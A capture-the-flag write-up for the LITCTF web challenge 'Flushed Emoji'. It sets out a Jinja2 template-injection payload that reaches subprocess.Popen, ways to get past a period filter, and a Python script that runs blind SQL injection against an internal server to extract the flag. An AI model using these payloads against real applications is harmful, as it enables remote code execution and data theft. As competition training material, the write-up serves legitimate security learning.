# Flushed Emoji
![](https://img.shields.io/badge/category-web-blue)
![](https://img.shields.io/badge/solves-49-orange)

## Description
Flushed emojis are so cool! Learn more about them [here](http://litctf.live:31781/)!

[FlushedEmojis.zip](https://drive.google.com/uc?export=download&id=1agW3a0-T4VsSJwJVTZ-dWSRLE_byxJya)

## Solution
In web challenges with source code, I usually like to check out the website first to see what it does. The home page has a button to launch the popup, containing a login form. Upon entering some dud credentials, it simply says `ok thank you for your info i have now sold your password (b) for 2 donuts :)`.

Weird, the password is returned back to us. That's definitely worth taking a look at, since websites don't normally do that.

That's all the website offered, so it was time to peek at the source code. Taking a look at `main-server/main.py`, it looks like it:
1. Blocks any requests with a `.` in the password.
2. Send a POST request to the other server with our username and password, but with non-alphanumeric characters stripped.
3. Returns a success message if the server returns "True"
4. Returns the fail message with our password in it otherwise (presumably "False")

The key is noticing that it returns `render_template_string` with our original password directly substituted in, meaning we can perform a SSTI attack.

To test this, we can try using `{{config}}` as the password, which would print the web app's configuration settings if it is vulnerable. Success!

![](https://user-images.githubusercontent.com/62577178/182054055-b7c532a4-e0a6-4fe7-9b18-4faa58649be2.png)

Looks like the config doesn't contain useful information, so it's more likely that we'll have to abuse the SSTI to gain remote code execution. Time to look at the other server.

In the data-server, there is a `/runquery` endpoint, which gets the JSON POST data, and executes unfiltered SQL on the username and password. This is not exploitable with a typical SQLi attack, since any quotes we insert into the username and password will get filtered. However, these rules don't apply to our remote code execution. This endpoint returns "True" if there is a matching record, and "False" otherwise. This means we'll need our exploit code to make the request to that endpoint, perform boolean SQL injection, and check the results. First though, we'll need to get remote code execution.

Since periods are banned, we can abuse some Python properties to access methods and attributes without using periods. Specifically:
- for some objects, `object["attribute_name"]` and `object["method_name"]()` work
- for other objects where that doesn't work, `getattr(object, "attribute_name")` and `getattr(object, "method_name")()` work

Additionally, we can use any loaded class, because Python provides `__mro__` to access a class's superclass, and `__subclasses__()` to access any subclasses of the current class. This means that by going up the `__mro__` chain, we will arrive at the `Object` class, which is the superclass of every other class.
```
$ curl -X POST -F username=a -F password='{{self["__class__"]["__mro__"]}}' http://litctf.live:31781/
ok thank you for your info i have now sold your password ((&lt;class &#39;jinja2.runtime.TemplateReference&#39;&gt;, &lt;class &#39;object&#39;&gt;)) for 2 donuts :)
$ curl -X POST -F username=a -F password='{{self["__class__"]["__mro__"][1]}}' http://litctf.live:31781/
ok thank you for your info i have now sold your password (&lt;class &#39;object&#39;&gt;) for 2 donuts :)
$ curl -X POST -F username=a -F password='{{self["__class__"]["__mro__"][1]["__subclasses__"]()}}' http://litctf.live:31781/
ok thank you for your info i have now sold your password ([&lt;class &#39;type&#39;&gt;, &lt;class &#39;weakref&#39;&gt;, &lt;class &#39;weakca...
```

In most related SSTI challenges, `subprocess.Popen` is what we're looking for. This is because it grants us remote code execution through `subprocess.Popen("command", stdout=-1, shell=True)["communicate"]()`. Through some trial and error, I determined that it existed at either index 247 or 250 (it changes between workers for some reason).

Thus, our exploit would be
```
username: anything
password: {{ self["__class__"]["__mro__"][1]["__subclasses__"]()[247 or 250]("command", stdout=-1, shell=True)["communicate"]() }}
```

Before we can perform the SQLi, it is necessary to find the IP of the data-server (it's redacted in the source code) as well as what tools are available at our disposal.

With `ls -l`:
```
ok thank you for your info i have now sold your password ((b&#39;total 20\n-rw-rw-r-- 1 root root 1212 Jul 20 19:38 main.py\n-rw-r--r-- 1 root root   24 Jul 20 02:13 requirements.txt\n-rwxrwxr-x 1 root root  351 Jul 20 19:38 run.sh\ndrwxrwxr-x 2 root root 4096 Jul 20 02:09 static\ndrwxrwxr-x 2 root root 4096 Jul 20 02:26 templates\n&#39;, None)) for 2 donuts :)
```
Looks like `main.py` is in our current directory. For the challenge to actually work, it must contain the uncensored IP.

With `cat main.py`:
```
lmao no way you have . in your password LOL
```
Oops, I forgot about the filter. Instead, we can `cat *`
```
... [some data omitted] ...
requests.post(\&#39;http://172.24.0.8:8080/runquery\&#39;
... [some data omitted] ...
```
Great, the remote server is at `http://172.24.0.8:8080/runquery`. Now, what tools are available?
```
which curl:
ok thank you for your info i have now sold your password ((b&#39;&#39;, None)) for 2 donuts :)

which wget:
ok thank you for your info i have now sold your password ((b&#39;&#39;, None)) for 2 donuts :)

which python3:
ok thank you for your info i have now sold your password ((b&#39;/usr/bin/python3\n&#39;, None)) for 2 donuts :)
```

Looks like we'll have to use Python to do our bidding. Before trying to get the full exploit, let's first write the Python command that will successfully perform SQLi against this data server locally. I used:
```py
import requests
print(requests.post('http://172.24.0.8:8080/runquery',
                    json={'username': "flag' and substr(password, 1, 1)='L'--", 'password': ''}).text)
```
This did have the intended effect, so now I had to get rid of the periods.
1. To get rid of the `requests.post` period, I simply changed `import requests` to `from requests import post` and called `post(url, data)` instead
2. To get rid of the periods in the url, I replaced them with `chr(46)`, becoming `'http://172'+chr(46)+'24'+chr(46)+'0'+chr(46)+'8:8080/runquery'`
3. To get rid of the `.text`, I tried replacing it with `['text']`, which didn't work, so instead, the entire post request had to be wrapped as `getattr(post(url, data), 'text')`

This results in:
```py
from requests import post
print(getattr(post('http://172'+chr(46)+'24'+chr(46)+'0'+chr(46)+'8:8080/runquery',
                    json={'username': "flag' and substr(password, 1, 1)='L'--", 'password': ''}), 'text'))
```

And in command form:
```python
python3 -c "from requests import post;print(getattr(post('http://172'+chr(46)+'24'+chr(46)+'0'+chr(46)+'8:8080/runquery', json={'username': \"flag' and substr(password, 1, 1)='L'--\", 'password': ''}), 'text'))"
```

Now, this needs to be executed in the context of the SSTI RCE, in which we run `subprocess.Popen("command", ...)`, so the command needs to be escaped again.

```python
subprocess.Popen("python3 -c \"from requests import post;print(getattr(post('http://172'+chr(46)+'24'+chr(46)+'0'+chr(46)+'8:8080/runquery', json={'username': \\\"flag' and substr(password, 1, 1)='L'--\\\", 'password': ''}), 'text'))\"", stdout=-1, shell=True)['communicate']()
```

And finally, this can be wrapped in the double braces and MRO/subclass hacking.

![image](https://user-images.githubusercontent.com/62577178/182056485-d6cba7fd-8760-489a-be3d-a2c87e21273e.png)

When bruteforcing, `POPEN_NUM` is to be replaced with 247 or 250, depending on which one is working, `IDX_J` is to be replaced with the index of the character we're guessing, and `LTR` is to be replaced with the character we're guessing.

```py
import requests

url = 'http://litctf.live:31781/'
flag = 'LITCTF{'
j = len(flag)+1

payload = '{{self[\'__class__\'][\'__mro__\'][1][\'__subclasses__\']()[POPEN_NUM]("python3 -c \\"from requests import post;print(getattr(post(\'http://172\'+chr(46)+\'24\'+chr(46)+\'0\'+chr(46)+\'8:8080/runquery\', json={\'username\': \\\\\\"flag\' AND substr(password, IDX_J, 1)=\'LTR\'--\\\\\\", \'password\': \'\'}), \'text\'))\\"", stdout=-1, shell=True)[\'communicate\']()}}'
"""
{{self['__class__']['__mro__'][1]['__subclasses__']()[247]("python3 -c \"from requests import post;print(getattr(post('http://172'+chr(46)+'24'+chr(46)+'0'+chr(46)+'8:8080/runquery', json={'username': \\\"flag' AND substr(password, 1, 1)='P'--\\\", 'password': ''}), 'text'))\"", stdout=-1, shell=True)['communicate']()}}
"""


while True:
 for i in range(ord(' '), 128):
  print(flag + chr(i))
  pay = payload.replace("IDX_J", str(j)).replace("LTR", chr(i)).replace("POPEN_NUM", "247");
  res = requests.post(url, data={'username': 'a', 'password': pay})
  if 'Internal Server Error' in res.text:
    print('index 247 broken, trying 250')
    pay = payload.replace("IDX_J", str(j)).replace("LTR", chr(i)).replace("POPEN_NUM", "250");
    res = requests.post(url, data={'username': 'a', 'password': pay})
  if 'True' in res.text:
    flag += chr(i)
    j += 1
```

This leaked the flag up until `LITCTF{flush3d_3m0ji_o`. For some reason, the next character just wasn't leaking, so I replaced it with a `?` and kept going.

`LITCTF{flush3d_3m0ji_o?0}`

At this point, I was utterly confused, until I remembered that any of my guesses with a period were being filtered, so the missing character was likely a period.

Flag: `LITCTF{flush3d_3m0ji_o.0}`

## Afterthoughts
After the CTF was over, I realized two things I could have done to make my life much easier.
1. Instead of directly substituting the guess character in and being susceptible to the filter, I should have used sqlite's hex filter to check the ascii code instead.
2. There was no need to go to such great lengths to avoid periods; all I had to do was replace them with `\x2E` as it would pass by the filter undetected, but get translated into a period when running code.
